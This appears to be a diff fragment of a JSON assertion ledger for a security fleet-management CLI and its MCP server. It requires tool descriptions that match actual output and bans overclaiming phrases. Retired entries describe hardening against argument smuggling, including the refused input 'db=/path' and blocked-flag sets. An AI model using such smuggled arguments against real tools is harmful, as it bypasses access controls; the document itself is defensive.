+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate_test.go",
+     "contains": "func TestWriteCommandsDryRunPreviewsWithoutSending(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate_test.go",
+     "contains": "func TestImportRequiresConfirmation(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate_test.go",
+     "contains": "func TestRunProfileYesDoesNotConfirmWrites(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate_test.go",
+     "contains": "func TestWriteCommandExamplesCarryConfirmation(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "contains": "Per-org rollup of agent health: for each org with a gap, how many agents have a stale callback, an unreadable callback time, or Defender or firewall not reported healthy, worst-first.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "contains": "One-screen fleet top-line: total orgs and agents, open incidents, open criticals, the oldest open critical's age, stale agents, and orgs with zero agents.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "contains": "Given an indicator (IP, MAC, domain or hostname, file hash, or text fragment), finds the matching incident reports, agents, and external ports across every org - instant correlation during incident response.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "contains": "SLA aging report: open incidents bucketed by hours open, each bucket broken out by severity; the oldest bucket is flagged as an SLA breach when any incident has aged into it.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "contains": "Per-client QBR rollup for one org: agent count, open, closed and total incidents, and mean time-to-resolve.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "contains": "Compares the seats on each account's latest invoice, summed, with the agents in the local mirror and reports the delta.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "contains": "Per-account roll-up for resellers: subscription count and products, minimum usage by product, deployed agent count, and deployed agents against the active EDR minimum.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "contains": "Diffs the agent list against the snapshot its previous run saved: agents added, agents removed, and agents whose last callback has not moved since then.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "contains": "Shift-change report of what happened in a look-back window (new incidents, resolved incidents, new escalations), ready to paste into a handoff note.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "contains": "Use to clean up the fleet and to explain a billing-reconcile delta with the agents that stopped reporting.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "contains": "Use to enforce response SLAs across tenants: the oldest bucket counts, by severity, the open incidents past your SLA.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "contains": "for invoiced seats against deployed agents inside one account use billing-reconcile instead.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "contains": "Run after each sync to see which agents were added, removed, or went quiet since the previous drift run.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "Per-org rollup of agent health: for each org with a gap, how many agents have a stale callback, an unreadable callback time, or Defender or firewall not reported healthy, worst-first.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "One-screen fleet top-line: total orgs and agents, open incidents, open criticals, the oldest open critical's age, stale agents, and orgs with zero agents.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "Given an indicator (IP, MAC, domain or hostname, file hash, or text fragment), finds the matching incident reports, agents, and external ports across every org - instant correlation during incident response.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "SLA aging report: open incidents bucketed by hours open, each bucket broken out by severity; the oldest bucket is flagged as an SLA breach when any incident has aged into it.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "Per-client QBR rollup for one org: agent count, open, closed and total incidents, and mean time-to-resolve.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "Compares the seats on each account's latest invoice, summed, with the agents in the local mirror and reports the delta.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "Per-account roll-up for resellers: subscription count and products, minimum usage by product, deployed agent count, and deployed agents against the active EDR minimum.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "Diffs the agent list against the snapshot its previous run saved: agents added, agents removed, and agents whose last callback has not moved since then.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "Shift-change report of what happened in a look-back window (new incidents, resolved incidents, new escalations), ready to paste into a handoff note.",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "outdated EDR versions"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "orgs below coverage threshold"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "coverage percent"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "posture grade"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "status flips, new criticals, and version changes"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "invoice total, subscribed seats"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "Compares invoiced and subscribed seat counts"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "broken out by org and severity"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "(new criticals, resolutions, escalations)"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "foothold signature), finds every agent, org, and incident"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "outdated EDR versions"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "orgs below coverage threshold"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "coverage percent"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "posture grade"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "status flips, new criticals, and version changes"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "invoice total, subscribed seats"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "Compares invoiced and subscribed seat counts"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "broken out by org and severity"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "(new criticals, resolutions, escalations)"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "foothold signature), finds every agent, org, and incident"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "feed billing-reconcile with the list"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "surface the oldest unactioned criticals first"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "for per-org drift inside one account"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "Use after each sync to see what changed across the fleet"
+    }
+   ]
+  },
+  {
+   "id": "novel-descriptions-match-output",
+   "class": "doc-claims-output",
+   "summary": "The MCP novel-feature descriptions in internal/mcp/tools.go describe the fields each novel command actually emits",
+   "why": "The 4.34.0 render carried research-time descriptions into tools.go that promised analyses the commands do not produce (coverage percent and posture grade from org-scorecard, invoice totals from reseller-rollup, version changes from drift, outdated EDR versions from coverage-gaps, per-org reconciliation from billing-reconcile). An agent choosing a tool from these descriptions would act on output that does not exist. Each corrected string is required and each overclaim phrase banned, so a re-render from the old research fails this ledger.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"description\": \"Per-org rollup of agent health: for each org with a gap, how many agents have a stale callback, an unreadable callback time, or Defender or firewall not reported healthy, worst-first.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"description\": \"Given an indicator (IP, MAC, domain or hostname, file hash, or text fragment), finds the matching incident reports, agents, and external ports across every org - instant correlation during incident response.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"description\": \"SLA aging report: open incidents bucketed by hours open, each bucket broken out by severity; the oldest bucket is flagged as an SLA breach when any incident has aged into it.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"description\": \"Compares the seats on each account's latest invoice, summed, with the agents in the local mirror and reports the delta.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"rationale\": \"Joins each account's latest invoice with the agent count in the local mirror; the API never correlates the two.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"description\": \"Diffs the agent list against the snapshot its previous run saved: agents added, agents removed, and agents whose last callback has not moved since then.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"rationale\": \"Compares against the agent snapshot its own previous run saved; the live API is point-in-time only.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"rationale\": \"Computed from each closed incident's sent_at and closed_at\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"description\": \"Per-client QBR rollup for one org: agent count, open, closed and total incidents, and mean time-to-resolve.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"rationale\": \"Joins one org's agents and incidents and computes MTTR from their timestamps\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"description\": \"Shift-change report of what happened in a look-back window (new incidents, resolved incidents, new escalations), ready to paste into a handoff note.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"rationale\": \"A look-back window over incident sent and closed times and escalation created times, across every org in the local store.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"description\": \"One-screen fleet top-line: total orgs and agents, open incidents, open criticals, the oldest open critical's age, stale agents, and orgs with zero agents.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"description\": \"Per-account roll-up for resellers: subscription count and products, minimum usage by product, deployed agent count, and deployed agents against the active EDR minimum.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"rationale\": \"Joins reseller accounts, their subscriptions, and each account's agent count across the /v1/accounts/{id} axis\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"insight\": \"Joins each account's latest invoice with the agent count in the local mirror; the API never correlates the two.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"insight\": \"Compares against the agent snapshot its own previous run saved; the live API is point-in-time only.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"insight\": \"Computed from each closed incident's sent_at and closed_at; the API exposes the timestamps but never the metric.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"insight\": \"Joins one org's agents and incidents and computes MTTR from their timestamps into a single rollup the API returns nowhere pre-aggregated.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"insight\": \"A look-back window over incident sent and closed times and escalation created times, across every org in the local store.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"insight\": \"Joins reseller accounts, their subscriptions, and each account's agent count across the /v1/accounts/{id} axis; the API never correlates them.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "coverage percent"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "invoice total"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "status flips"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "orgs below coverage threshold"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "two sync states"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "plus history for MTTR and trend"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "Snapshot diff plus"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "reseller invoices, subscriptions"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "against a live per-org agent count"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "history captured across syncs"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "broken out by org and severity"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "(new criticals, resolutions, escalations)"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "finds every agent, org"
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "windows-sddl-alias-sid-compare",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #5041 (4.33.6): trustees are resolved to SIDs (LA through the OS) and compared by SID; the press generates the alias tests."
+  },
+  {
+   "id": "windows-null-dacl-behind-flags",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #5041 (4.33.6): the DACL section's flags and ACE list are framed (daclFlagsRe, aceListRe), so a NULL DACL behind flags is refused."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
   }
  ]
 }
